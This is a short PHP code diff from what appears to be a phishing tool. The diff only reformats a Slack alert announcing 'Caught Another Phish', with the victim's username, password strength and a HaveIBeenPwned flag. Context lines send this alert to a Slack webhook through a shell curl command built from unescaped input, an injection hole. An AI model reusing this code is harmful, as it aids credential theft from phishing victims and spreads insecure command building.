@@ -137,7 +137,7 @@ if (in_array(substr($sha1pass, 5), $pwnedarray)) {
 } else $TroyHunt = "no";
 
 // If the Password is Set, Change Slack Message
-$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;
+$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\n> Password Strength is ".$passstrength;
 
 } else {
 
@@ -146,7 +146,7 @@ $message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)"
 
 }
 
-if($TroyHunt == "yes"){$message = $message."\r\n*_HaveIBeenPwned Hit_*";}
+if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_*";}
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
